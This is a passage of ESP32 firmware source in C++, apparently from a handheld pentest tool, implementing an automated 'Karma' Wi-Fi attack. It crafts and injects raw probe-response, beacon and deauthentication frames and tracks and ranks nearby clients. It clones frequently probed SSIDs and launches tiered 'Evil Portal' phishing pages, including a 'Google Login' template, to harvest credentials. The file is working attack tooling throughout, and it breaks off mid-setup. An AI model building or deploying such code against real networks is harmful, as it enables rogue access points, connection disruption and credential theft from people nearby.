void sendProbeResponse(const String &ssid, const String &mac, uint8_t channel) {
    if (ssid.isEmpty() || mac.isEmpty()) return;

    uint8_t probeResponse[128] = {0};
    uint8_t pos = 0;

    probeResponse[pos++] = 0x50;
    probeResponse[pos++] = 0x00;

    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;

    sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &probeResponse[pos], &probeResponse[pos+1], &probeResponse[pos+2],
           &probeResponse[pos+3], &probeResponse[pos+4], &probeResponse[pos+5]);
    pos += 6;

    memcpy(&probeResponse[pos], currentBSSID, 6);
    pos += 6;

    memcpy(&probeResponse[pos], currentBSSID, 6);
    pos += 6;

    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = 0x00;

    for (int i = 0; i < 8; i++) probeResponse[pos++] = 0x00;

    probeResponse[pos++] = 0x64;
    probeResponse[pos++] = 0x00;

    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = 0x04;

    probeResponse[pos++] = 0x00;
    probeResponse[pos++] = ssid.length();
    memcpy(&probeResponse[pos], ssid.c_str(), ssid.length());
    pos += ssid.length();

    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = sizeof(rates);
    memcpy(&probeResponse[pos], rates, sizeof(rates));
    pos += sizeof(rates);

    probeResponse[pos++] = 0x03;
    probeResponse[pos++] = 0x01;
    probeResponse[pos++] = channel;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, probeResponse, pos, false);

    if (err == ESP_OK) {
        karmaResponsesSent++;
        Serial.printf("[KARMA] Sent probe response for %s to %s on ch%d\n", 
                     ssid.c_str(), mac.c_str(), channel);
    }
}

void sendDeauth(const String &mac, uint8_t channel, bool broadcast) {
    if (!karmaConfig.enableDeauth) return;

    uint8_t deauthPacket[26] = {0};

    deauthPacket[0] = 0xC0;
    deauthPacket[1] = 0x00;

    if (broadcast) {
        memset(&deauthPacket[2], 0xFF, 6);
    } else {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &deauthPacket[2], &deauthPacket[3], &deauthPacket[4],
               &deauthPacket[5], &deauthPacket[6], &deauthPacket[7]);
    }

    memcpy(&deauthPacket[8], currentBSSID, 6);
    memcpy(&deauthPacket[14], currentBSSID, 6);

    deauthPacket[20] = 0x00;
    deauthPacket[21] = 0x00;
    deauthPacket[22] = 0x01;
    deauthPacket[23] = 0x00;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, 24, false);

    deauthPacketsSent++;
}

// Send beacon frames for active networks
void sendBeaconFrames() {
    unsigned long now = millis();
    if (now - lastBeaconTime < BEACON_INTERVAL_MS / 10) {
        return;
    }
    
    lastBeaconTime = now;
    
    size_t numNetworks = std::min(activeNetworks.size(), (size_t)MAX_CONCURRENT_SSIDS);
    for (size_t i = 0; i < numNetworks; i++) {
        if (activeNetworks[i].lastBeacon + BEACON_INTERVAL_MS < now) {
            uint8_t beaconFrame[256];
            size_t frameLen = buildBeaconFrame(beaconFrame, 
                                              activeNetworks[i].ssid,
                                              activeNetworks[i].channel,
                                              activeNetworks[i].rsn);
            
            esp_wifi_set_channel(activeNetworks[i].channel, WIFI_SECOND_CHAN_NONE);
            esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, frameLen, false);
            
            activeNetworks[i].lastBeacon = now;
            beaconsSent++;
            
            if (beaconsSent % 100 == 0) {
                Serial.printf("[BEACON] Sent %d beacons for %s\n", 
                             beaconsSent, activeNetworks[i].ssid.c_str());
            }
        }
    }
}

// Process response queue (low-latency)
void processResponseQueue() {
    unsigned long now = millis();
    
    while (!responseQueue.empty()) {
        ProbeResponseTask &task = responseQueue.front();
        
        if (now - task.timestamp > RESPONSE_TIMEOUT_MS) {
            responseQueue.pop();
            continue;
        }
        
        uint8_t responseFrame[256];
        size_t frameLen = buildEnhancedProbeResponse(responseFrame,
                                                    task.ssid,
                                                    task.targetMAC,
                                                    task.channel,
                                                    task.rsn);
        
        esp_wifi_set_channel(task.channel, WIFI_SECOND_CHAN_NONE);
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, responseFrame, frameLen, false);
        
        if (err == ESP_OK) {
            karmaResponsesSent++;
            
            auto it = networkHistory.find(task.ssid);
            if (it == networkHistory.end()) {
                NetworkHistory history;
                history.ssid = task.ssid;
                history.responsesSent = 1;
                history.lastResponse = now;
                history.successfulConnections = 0;
                networkHistory[task.ssid] = history;
            } else {
                it->second.responsesSent++;
                it->second.lastResponse = now;
            }
            
            bool found = false;
            for (auto &net : activeNetworks) {
                if (net.ssid == task.ssid) {
                    found = true;
                    net.lastActivity = now;
                    break;
                }
            }
            
            if (!found && activeNetworks.size() < MAX_CONCURRENT_SSIDS) {
                ActiveNetwork net;
                net.ssid = task.ssid;
                net.channel = task.channel;
                net.rsn = task.rsn;
                net.lastActivity = now;
                net.lastBeacon = 0;
                activeNetworks.push_back(net);
            }
        }
        
        responseQueue.pop();
    }
}

// Queue probe response for fast processing
void queueProbeResponse(const ProbeRequest &probe, const RSNInfo &rsn) {
    if (macBlacklist.find(probe.mac) != macBlacklist.end()) {
        if (millis() - macBlacklist[probe.mac] < 60000) {
            return;
        } else {
            macBlacklist.erase(probe.mac);
        }
    }
    
    ProbeResponseTask task;
    task.ssid = probe.ssid;
    task.targetMAC = probe.mac;
    task.channel = probe.channel;
    task.rsn = rsn;
    task.timestamp = millis();
    
    responseQueue.push(task);
    
    if (responseQueue.size() <= 3) {
        processResponseQueue();
    }
}

// Check for successful connections (associations)
void checkForAssociations() {
    unsigned long now = millis();
    
    for (auto &client : clientBehaviors) {
        if (client.second.probeCount > 5 && 
            now - client.second.lastSeen < 5000) {
            
            for (const auto &ssid : client.second.probedSSIDs) {
                auto it = networkHistory.find(ssid);
                if (it != networkHistory.end()) {
                    if (now - it->second.lastResponse < 10000) {
                        it->second.successfulConnections++;
                        
                        if (it->second.successfulConnections % 10 == 0) {
                            Serial.printf("[SUCCESS] Potential %d connections to %s\n",
                                         it->second.successfulConnections, ssid.c_str());
                        }
                    }
                }
            }
        }
    }
}

void smartChannelHop() {
    if (!auto_hopping) return;

    unsigned long now = millis();
    if (now - last_ChannelChange < hop_interval) return;

    if (channelActivity[channl] > 20) {
        hop_interval = DEFAULT_HOP_INTERVAL * 3;
        return;
    }

    currentPriorityChannel = (currentPriorityChannel + 1) % NUM_PRIORITY_CHANNELS;
    channl = priorityChannels[currentPriorityChannel] - 1;

    esp_wifi_set_promiscuous(false);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(priorityChannels[currentPriorityChannel], secondCh);
    delay(50);
    esp_wifi_set_promiscuous(true);

    last_ChannelChange = now;
    redrawNeeded = true;
    hop_interval = DEFAULT_HOP_INTERVAL;

    Serial.printf("[CHANNEL] Switched to channel %d\n", priorityChannels[currentPriorityChannel]);
}

void updateChannelActivity(uint8_t channel) {
    if (channel >= 1 && channel <= 14) {
        channelActivity[channel - 1]++;
    }
}

uint8_t getBestChannel() {
    uint8_t best = 1;
    uint16_t maxActivity = 0;

    for (int i = 0; i < 14; i++) {
        if (channelActivity[i] > maxActivity) {
            maxActivity = channelActivity[i];
            best = i + 1;
        }
    }

    return best;
}

void updateSSIDFrequency(const String &ssid) {
    if (ssid.isEmpty()) return;

    ssidFrequency[ssid]++;

    static unsigned long lastSort = 0;
    if (millis() - lastSort > 5000) {
        lastSort = millis();

        popularSSIDs.clear();
        for (const auto &pair : ssidFrequency) {
            popularSSIDs.push_back(std::make_pair(pair.first, pair.second));
        }

        std::sort(popularSSIDs.begin(), popularSSIDs.end(),
            [](const auto &a, const auto &b) { return a.second > b.second; });
    }
}

void checkCloneAttackOpportunities() {
    if (!attackConfig.enableCloneMode || popularSSIDs.empty()) return;

    if (millis() - lastFrequencyReset > SSID_FREQUENCY_RESET) {
        ssidFrequency.clear();
        popularSSIDs.clear();
        lastFrequencyReset = millis();
        return;
    }

    size_t maxNetworks = std::min((size_t)attackConfig.maxCloneNetworks, popularSSIDs.size());
    for (size_t i = 0; i < maxNetworks; i++) {
        const auto &ssidPair = popularSSIDs[i];

        if (ssidPair.second >= attackConfig.cloneThreshold) {
            bool alreadyAttacking = false;
            for (const auto &portal : pendingPortals) {
                if (portal.ssid == ssidPair.first && portal.isCloneAttack) {
                    alreadyAttacking = true;
                    break;
                }
            }

            if (!alreadyAttacking) {
                PendingPortal portal;
                portal.ssid = ssidPair.first;
                portal.channel = getBestChannel();
                portal.timestamp = millis();
                portal.launched = false;
                portal.templateName = selectedTemplate.name;
                portal.templateFile = selectedTemplate.filename;
                portal.isDefaultTemplate = selectedTemplate.isDefault;
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 100;
                portal.tier = TIER_CLONE;
                portal.duration = (uint16_t)attackConfig.cloneDuration;
                portal.isCloneAttack = true;
                portal.probeCount = ssidPair.second;

                pendingPortals.push_back(portal);

                Serial.printf("[CLONE] Scheduled clone attack for %s (%d probes)\n",
                            ssidPair.first.c_str(), ssidPair.second);
            }
        }
    }
}

void loadPortalTemplates() {
    portalTemplates.clear();

    portalTemplates.push_back({"Google Login", "", true, false});
    portalTemplates.push_back({"Router Update", "", true, true});

    if (LittleFS.begin()) {
        if (!LittleFS.exists("/PortalTemplates")) {
            LittleFS.mkdir("/PortalTemplates");
        }

        if (LittleFS.exists("/PortalTemplates")) {
            File root = LittleFS.open("/PortalTemplates");
            File file = root.openNextFile();

            while (file) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    tmpl.name = String(file.name());
                    tmpl.name.replace(".html", "");
                    tmpl.filename = "/PortalTemplates/" + String(file.name());
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;

                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) {
                        tmpl.verifyPassword = true;
                    }

                    portalTemplates.push_back(tmpl);
                    Serial.printf("[TEMPLATE] Loaded custom: %s\n", tmpl.name.c_str());
                }
                file = root.openNextFile();
            }
        }
        LittleFS.end();
    }

    if (SD.begin()) {
        if (!SD.exists("/PortalTemplates")) {
            SD.mkdir("/PortalTemplates");
        }

        if (SD.exists("/PortalTemplates")) {
            File root = SD.open("/PortalTemplates");
            File file = root.openNextFile();

            while (file) {
                if (!file.isDirectory() && String(file.name()).endsWith(".html")) {
                    PortalTemplate tmpl;
                    tmpl.name = "[SD] " + String(file.name());
                    tmpl.name.replace(".html", "");
                    tmpl.filename = "/PortalTemplates/" + String(file.name());
                    tmpl.isDefault = false;
                    tmpl.verifyPassword = false;

                    String firstLine = file.readStringUntil('\n');
                    if (firstLine.indexOf("verify=\"true\"") != -1) {
                        tmpl.verifyPassword = true;
                    }

                    portalTemplates.push_back(tmpl);
                    Serial.printf("[TEMPLATE] Loaded SD: %s\n", tmpl.name.c_str());
                }
                file = root.openNextFile();
            }
        }
        SD.end();
    }
}

bool selectPortalTemplate() {
    loadPortalTemplates();

    if (portalTemplates.empty()) {
        displayTextLine("No templates found!");
        delay(2000);
        return false;
    }

    drawMainBorderWithTitle("SELECT TEMPLATE");

    std::vector<Option> templateOptions;

    for (const auto &tmpl : portalTemplates) {
        String displayName = tmpl.name;
        if (tmpl.isDefault) displayName = "[D] " + displayName;
        if (tmpl.verifyPassword) displayName += " (verify)";

        templateOptions.push_back({displayName.c_str(), [=, &tmpl]() {
            selectedTemplate = tmpl;
            templateSelected = true;

            drawMainBorderWithTitle("KARMA SETUP");
            displayTextLine("Selected: " + tmpl.name);
            delay(1000);
        }});
    }

    templateOptions.push_back({"Load Custom File", [=]() {
        std::vector<Option> loadOptions;

        loadOptions.push_back({"Load from SD", [=]() {
            if (setupSdCard()) {
                String templateFile = loopSD(SD, true, "HTML");
                if (templateFile.length() > 0) {
                    PortalTemplate customTmpl;
                    customTmpl.name = "[Custom] " + templateFile;
                    customTmpl.filename = templateFile;
                    customTmpl.isDefault = false;
                    customTmpl.verifyPassword = false;

                    File file = SD.open(templateFile, FILE_READ);
                    if (file) {
                        String firstLine = file.readStringUntil('\n');
                        file.close();
                        if (firstLine.indexOf("verify=\"true\"") != -1) {
                            customTmpl.verifyPassword = true;
                            customTmpl.name += " (verify)";
                        }
                    }

                    selectedTemplate = customTmpl;
                    templateSelected = true;
                    portalTemplates.push_back(customTmpl);

                    drawMainBorderWithTitle("KARMA SETUP");
                    displayTextLine("Selected: " + customTmpl.name);
                    delay(1000);
                }
            } else {
                displayTextLine("SD Card not found!");
                delay(1000);
            }
        }});

        loadOptions.push_back({"Load from LittleFS", [=]() {
            if (LittleFS.begin()) {
                String templateFile = loopSD(LittleFS, true, "HTML");
                if (templateFile.length() > 0) {
                    PortalTemplate customTmpl;
                    customTmpl.name = "[Custom] " + templateFile;
                    customTmpl.filename = templateFile;
                    customTmpl.isDefault = false;
                    customTmpl.verifyPassword = false;

                    File file = LittleFS.open(templateFile, FILE_READ);
                    if (file) {
                        String firstLine = file.readStringUntil('\n');
                        file.close();
                        if (firstLine.indexOf("verify=\"true\"") != -1) {
                            customTmpl.verifyPassword = true;
                            customTmpl.name += " (verify)";
                        }
                    }

                    selectedTemplate = customTmpl;
                    templateSelected = true;
                    portalTemplates.push_back(customTmpl);

                    drawMainBorderWithTitle("KARMA SETUP");
                    displayTextLine("Selected: " + customTmpl.name);
                    delay(1000);
                }
                LittleFS.end();
            } else {
                displayTextLine("LittleFS error!");
                delay(1000);
            }
        }});

        loadOptions.push_back({"Back", [=]() {
            returnToMenu = false;
        }});

        loopOptions(loadOptions);
    }});

    templateOptions.push_back({"Disable Auto-Portal", [=]() {
        karmaConfig.enableAutoPortal = false;
        templateSelected = false;
        drawMainBorderWithTitle("KARMA SETUP");
        displayTextLine("Auto-portal disabled");
        delay(1000);
    }});

    loopOptions(templateOptions);

    return templateSelected;
}

void launchTieredEvilPortal(PendingPortal &portal) {
    Serial.printf("[TIER-%d] Launching portal for %s (Duration: %ds)\n", 
                 portal.tier, portal.ssid.c_str(), portal.duration / 1000);

    isPortalActive = true;

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(500);

    EvilPortal portalInstance(portal.ssid, portal.channel, 
                            karmaConfig.enableDeauth, portal.verifyPassword, true);

    unsigned long portalStart = millis();
    bool portalExited = false;

    while (millis() - portalStart < portal.duration) {
        if (check(EscPress)) {
            Serial.println("[PORTAL] Early exit requested");
            break;
        }

        delay(100);
    }

    Serial.printf("[PORTAL] Portal finished, returning to karma...\n");

    isPortalActive = false;
    restartKarmaAfterPortal = true;

    if (portal.isCloneAttack) {
        cloneAttacksLaunched++;
    } else {
        autoPortalsLaunched++;
    }
}

void executeTieredAttackStrategy() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive) return;

    std::sort(pendingPortals.begin(), pendingPortals.end(),
        [](const PendingPortal &a, const PendingPortal &b) {
            if (a.isCloneAttack && !b.isCloneAttack) return true;
            if (!a.isCloneAttack && b.isCloneAttack) return false;
            return a.priority > b.priority;
        });

    if (attackConfig.enableTieredAttack) {
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->isCloneAttack && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }

        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->tier == TIER_HIGH && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }

        std::vector<PendingPortal> mediumTargets;
        for (const auto &portal : pendingPortals) {
            if (portal.tier == TIER_MEDIUM && !portal.launched) {
                mediumTargets.push_back(portal);
                if (mediumTargets.size() >= 2) break;
            }
        }

        if (!mediumTargets.empty()) {
            for (auto &target : mediumTargets) {
                for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ++it) {
                    if (it->ssid == target.ssid && it->targetMAC == target.targetMAC) {
                        launchTieredEvilPortal(*it);
                        it->launched = true;
                        pendingPortals.erase(it);
                        return;
                    }
                }
            }
        }

        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (it->tier == TIER_FAST && !it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }
    } else {
        for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
            if (!it->launched) {
                launchTieredEvilPortal(*it);
                it->launched = true;
                it = pendingPortals.erase(it);
                return;
            } else {
                ++it;
            }
        }
    }
}

void checkPendingPortals() {
    if (pendingPortals.empty() || !templateSelected || isPortalActive) return;

    unsigned long now = millis();
    pendingPortals.erase(
        std::remove_if(pendingPortals.begin(), pendingPortals.end(),
            [now](const PendingPortal &p) {
                return (now - p.timestamp > 300000);
            }),
        pendingPortals.end()
    );

    executeTieredAttackStrategy();
}

void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
    Serial.printf("[MANUAL] Launching Evil Portal for %s (ch%d)\n", ssid.c_str(), channel);

    isPortalActive = true;

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(500);

    EvilPortal portalInstance(ssid, channel, karmaConfig.enableDeauth, verifyPwd, false);

    isPortalActive = false;
    restartKarmaAfterPortal = true;

    Serial.println("[MANUAL] Portal closed, returning to karma...");
}

// Handle broadcast response integration
void handleBroadcastResponse(const String& ssid, const String& mac) {
    if (broadcastAttack.isActive()) {
        broadcastAttack.processProbeResponse(ssid, mac);
        
        auto it = clientBehaviors.find(mac);
        if (it == clientBehaviors.end()) {
            ClientBehavior behavior;
            behavior.mac = mac;
            behavior.firstSeen = millis();
            behavior.lastSeen = millis();
            behavior.probeCount = 1;
            behavior.avgRSSI = -50;
            behavior.probedSSIDs.push_back(ssid);
            behavior.favoriteChannel = all_wifi_channels[channl];
            behavior.lastKarmaAttempt = 0;
            behavior.isVulnerable = true;
            
            clientBehaviors[mac] = behavior;
            uniqueClients++;
            
            Serial.printf("[BROADCAST] New client %s found via broadcast for %s\n",
                         mac.c_str(), ssid.c_str());
            
            if (karmaConfig.enableAutoKarma) {
                PendingPortal portal;
                portal.ssid = ssid;
                portal.channel = all_wifi_channels[channl];
                portal.targetMAC = mac;
                portal.timestamp = millis();
                portal.launched = false;
                portal.templateName = selectedTemplate.name;
                portal.templateFile = selectedTemplate.filename;
                portal.isDefaultTemplate = selectedTemplate.isDefault;
                portal.verifyPassword = selectedTemplate.verifyPassword;
                portal.priority = 70;
                portal.tier = TIER_HIGH;
                portal.duration = attackConfig.highTierDuration;
                portal.isCloneAttack = false;
                portal.probeCount = 1;
                
                pendingPortals.push_back(portal);
                
                Serial.printf("[BROADCAST] Scheduled attack for %s (responded to broadcast)\n",
                            ssid.c_str());
            }
        }
    }
}

// Enhanced probe sniffer with RSN detection
void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
    
    if (isProbeRequestWithSSID(pkt)) {
        String mac = extractMAC(pkt);
        String ssid = extractSSID(pkt);
        
        if (mac.isEmpty()) return;
        
        String cacheKey = mac + ":" + ssid;
        if (isMACInCache(cacheKey)) return;
        addMACToCache(cacheKey);
        
        RSNInfo rsn = extractRSNInfo(pkt->payload, pkt->rx_ctrl.sig_len);
        
        ProbeRequest probe;
        probe.mac = mac;
        probe.ssid = ssid;
        probe.rssi = ctrl.rssi;
        probe.timestamp = millis();
        probe.channel = all_wifi_channels[channl];
        probe.encryption_type = (rsn.akmSuite > 0) ? 3 : 0;
        
        probeBuffer[probeBufferIndex] = probe;
        probeBufferIndex = (probeBufferIndex + 1) % MAX_PROBE_BUFFER;
        if (probeBufferIndex == 0) bufferWrapped = true;
        
        totalProbes++;
        pkt_counter++;
        analyzeClientBehavior(probe);
        updateChannelActivity(probe.channel);
        updateSSIDFrequency(probe.ssid);
        
        // Broadcast attack integration
        if (broadcastAttack.isActive()) {
            std::vector<String> recentBroadcasts = SSIDDatabase::getPopularSSIDs(10);
            for (const auto& broadcastSSID : recentBroadcasts) {
                if (ssid == broadcastSSID) {
                    handleBroadcastResponse(ssid, mac);
                    break;
                }
            }
        }
        
        bool isRandomizedMAC = false;
        if (mac.startsWith("12:") || mac.startsWith("22:") || 
            mac.startsWith("32:") || mac.startsWith("42:")) {
            isRandomizedMAC = true;
        }
        
        static uint32_t fakeMACCounter = 0;
        if (isRandomizedMAC) {
            fakeMACCounter++;
            if (fakeMACCounter % 50 == 0) {
                macBlacklist[mac] = millis();
                Serial.printf("[FILTER] Blacklisted randomized MAC: %s\n", mac.c_str());
                return;
            }
        }
        
        if (broadcastAttack.isActive()) {
            broadcastAttack.processProbeResponse(ssid, mac);
        }
        
        if (karmaConfig.enableAutoKarma) {
            auto it = clientBehaviors.find(probe.mac);
            if (it != clientBehaviors.end()) {
                ClientBehavior &client = it->second;
                
                uint8_t priority = calculateAttackPriority(client, probe);
                
                if (priority >= attackConfig.priorityThreshold) {
                    if (millis() - client.lastKarmaAttempt > 10000) {
                        queueProbeResponse(probe, rsn);
                        client.lastKarmaAttempt = millis();
                        
                        AttackTier tier = determineAttackTier(priority);
                        
                        if (tier != TIER_NONE) {
                            PendingPortal portal;
                            portal.ssid = probe.ssid;
                            portal.channel = probe.channel;
                            portal.targetMAC = probe.mac;
                            portal.timestamp = millis();
                            portal.launched = false;
                            portal.templateName = selectedTemplate.name;
                            portal.templateFile = selectedTemplate.filename;
                            portal.isDefaultTemplate = selectedTemplate.isDefault;
                            portal.verifyPassword = selectedTemplate.verifyPassword;
                            portal.priority = priority;
                            portal.tier = tier;
                            portal.duration = getPortalDuration(tier);
                            portal.isCloneAttack = false;
                            portal.probeCount = 1;
                            
                            pendingPortals.push_back(portal);
                            
                            Serial.printf("[SCHEDULE] Tier %d attack for %s (RSN:%d)\n",
                                        tier, probe.ssid.c_str(), rsn.akmSuite);
                        }
                    }
                }
            }
        }
        
        if (rsn.akmSuite > 0) {
            Serial.printf("[PROBE] %s -> %s (RSSI:%d, ch:%d, RSN:%s)\n", 
                         mac.c_str(), ssid.c_str(), ctrl.rssi, probe.channel,
                         rsn.akmSuite == 2 ? "WPA3" : "WPA2");
        }
    }
}

void clearProbes() {
    probeBufferIndex = 0;
    bufferWrapped = false;
    totalProbes = 0;
    uniqueClients = 0;
    pkt_counter = 0;
    karmaResponsesSent = 0;
    deauthPacketsSent = 0;
    autoPortalsLaunched = 0;
    cloneAttacksLaunched = 0;
    beaconsSent = 0;
    pendingPortals.clear();
    activePortals.clear();
    activeNetworks.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();
    networkHistory.clear();
    macBlacklist.clear();

    memset(channelActivity, 0, sizeof(channelActivity));
    clientBehaviors.clear();

    while (!responseQueue.empty()) {
        responseQueue.pop();
    }

    if (macRingBuffer) {
        vRingbufferDelete(macRingBuffer);
        initMACCache();
    }

    Serial.println("[KARMA] All data cleared");
}

std::vector<ProbeRequest> getUniqueProbes() {
    std::vector<ProbeRequest> unique;
    std::set<String> seen;

    int start = bufferWrapped ? probeBufferIndex : 0;
    int count = bufferWrapped ? MAX_PROBE_BUFFER : probeBufferIndex;

    for (int i = 0; i < count; i++) {
        int idx = (start + i) % MAX_PROBE_BUFFER;
        const ProbeRequest &probe = probeBuffer[idx];
        String key = probe.mac + ":" + probe.ssid;

        if (seen.find(key) == seen.end()) {
            seen.insert(key);
            unique.push_back(probe);
        }
    }

    return unique;
}

std::vector<ClientBehavior> getVulnerableClients() {
    std::vector<ClientBehavior> vulnerable;

    for (const auto &pair : clientBehaviors) {
        if (pair.second.isVulnerable) {
            vulnerable.push_back(pair.second);
        }
    }

    return vulnerable;
}

// Enhanced update display
void updateKarmaDisplay() {
    unsigned long currentTime = millis();
    
    if (currentTime - last_time > 1000) {
        last_time = currentTime;
        
        tft.fillRect(10, tftHeight - 95, tftWidth - 20, 85, bruceConfig.bgColor);
        
        tft.setTextSize(1);
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        
        tft.setCursor(10, tftHeight - 90);
        tft.print("Total: " + String(totalProbes));
        
        tft.setCursor(10, tftHeight - 80);
        tft.print("Unique: " + String(uniqueClients));
        
        tft.setCursor(10, tftHeight - 70);
        tft.print("Karma: " + String(karmaResponsesSent));
        
        tft.setCursor(10, tftHeight - 60);
        tft.print("Beacons: " + String(beaconsSent));
        
        tft.setCursor(10, tftHeight - 50);
        tft.print("Active: " + String(activeNetworks.size()));
        
        tft.setCursor(10, tftHeight - 40);
        tft.print("Portals: " + String(autoPortalsLaunched));
        
        tft.setCursor(10, tftHeight - 30);
        tft.print("Clones: " + String(cloneAttacksLaunched));
        
        tft.setCursor(tftWidth/2, tftHeight - 90);
        tft.print("Pending: " + String(pendingPortals.size()));
        
        tft.setCursor(tftWidth/2, tftHeight - 80);
        tft.print("Ch: " + String(all_wifi_channels[channl]));
        
        tft.setCursor(tftWidth/2, tftHeight - 70);
        String hopStatus = String(auto_hopping ? "A:" : "M:") + String(hop_interval) + "ms";
        tft.print(hopStatus);
        
        tft.setCursor(tftWidth/2, tftHeight - 60);
        String tierText = "Tier: ";
        switch(attackConfig.defaultTier) {
            case TIER_CLONE: tierText += "Clone"; break;
            case TIER_HIGH: tierText += "High"; break;
            case TIER_MEDIUM: tierText += "Med"; break;
            case TIER_FAST: tierText += "Fast"; break;
            default: tierText += "None"; break;
        }
        tft.print(tierText);
        
        tft.setCursor(tftWidth/2, tftHeight - 50);
        tft.print("Queue: " + String(responseQueue.size()));
        
        tft.setCursor(tftWidth/2, tftHeight - 40);
        tft.print("MAC: " + String(currentBSSID[5] & 0xFF, HEX));
        
        if (broadcastAttack.isActive()) {
            tft.setCursor(tftWidth - 150, tftHeight - 100);
            tft.print("BROADCAST");
            
            float progress = broadcastAttack.getProgressPercent();
            tft.setCursor(tftWidth - 100, tftHeight - 100);
            tft.print(String(progress, 0) + "%");
        }
        
        if (templateSelected && !selectedTemplate.name.isEmpty()) {
            tft.fillRect(10, tftHeight - 100, tftWidth - 20, 10, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight - 100);
            String templateText = "Template: " + selectedTemplate.name;
            if (templateText.length() > 40) {
                templateText = templateText.substring(0, 37) + "...";
            }
            tft.print(templateText);
        }
        
        if (isPortalActive && !pendingPortals.empty()) {
            tft.fillRect(10, tftHeight - 110, tftWidth - 20, 10, bruceConfig.bgColor);
            tft.setCursor(10, tftHeight - 110);
            String attackText = "Attacking: " + pendingPortals[0].ssid;
            if (attackText.length() > 40) {
                attackText = attackText.substring(0, 37) + "...";
            }
            tft.print(attackText);
        }
    }
}

// Save network history to file
void saveNetworkHistory(FS &fs) {
    if (!fs.exists("/ProbeData")) fs.mkdir("/ProbeData");
    
    String filename = "/ProbeData/network_history_" + String(millis()) + ".csv";
    File file = fs.open(filename, FILE_WRITE);
    
    if (file) {
        file.println("SSID,ResponsesSent,SuccessfulConnections,LastResponse");
        
        for (const auto &history : networkHistory) {
            file.printf("\"%s\",%d,%d,%lu\n",
                       history.first.c_str(),
                       history.second.responsesSent,
                       history.second.successfulConnections,
                       history.second.lastResponse);
        }
        
        file.close();
        Serial.println("[HISTORY] Network history saved");
    }
}

// Main karma setup function - enhanced version
void karma_setup() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_stop();
    delay(100);
    
    returnToMenu = false;
    isPortalActive = false;
    restartKarmaAfterPortal = false;
    templateSelected = false;
    redrawNeeded = true;
    
    probeBufferIndex = 0;
    bufferWrapped = false;
    beaconsSent = 0;
    
    if (macRingBuffer) {
        vRingbufferDelete(macRingBuffer);
    }
    initMACCache();
    
    pendingPortals.clear();
    activePortals.clear();
    activeNetworks.clear();
    clientBehaviors.clear();
    ssidFrequency.clear();
    popularSSIDs.clear();
    networkHistory.clear();
    macBlacklist.clear();
    
    while (!responseQueue.empty()) {
        responseQueue.pop();
    }
    
    generateRandomBSSID(currentBSSID);
    lastMACRotation = millis();
    
    display_clear();
    drawMainBorderWithTitle("MODERN KARMA ATTACK");
    displayTextLine("Enhanced Karma v2.0");
    delay(500);
    
    if (!selectPortalTemplate()) {
        drawMainBorderWithTitle("KARMA SETUP");
        displayTextLine("Starting without portal...");
        delay(1000);
    }
    
    drawMainBorderWithTitle("ENHANCED KARMA ATK");
    
    FS *Fs;
    int redraw = true;
    String FileSys = "LittleFS";
    
    if (setupSdCard()) {
        Fs = &SD;
        FileSys = "SD";
        is_LittleFS = false;
        filen = generateUniqueFilename(SD, false);
    } else {
        Fs = &LittleFS;
        filen = generateUniqueFilename(LittleFS, false);
    }
    
    if (!Fs->exists("/ProbeData")) Fs->mkdir("/ProbeData");
    
    displayTextLine("Modern Karma Started");
    tft.setTextSize(FP);
    tft.setCursor(80, 100);
    
    clearProbes();
    
    karmaConfig.enableAutoKarma = true;
    karmaConfig.enableDeauth = false;
    karmaConfig.enableSmartHop = true;
    karmaConfig.prioritizeVulnerable = true;
    karmaConfig.enableAutoPortal = templateSelected;
    karmaConfig.maxClients = MAX_CLIENT_TRACK;
    
    attackConfig.defaultTier = TIER_HIGH;
    attackConfig.enableCloneMode = true;
    attackConfig.enableTieredAttack = true;
    attackConfig.priorityThreshold = 40;
    attackConfig.cloneThreshold = 5;
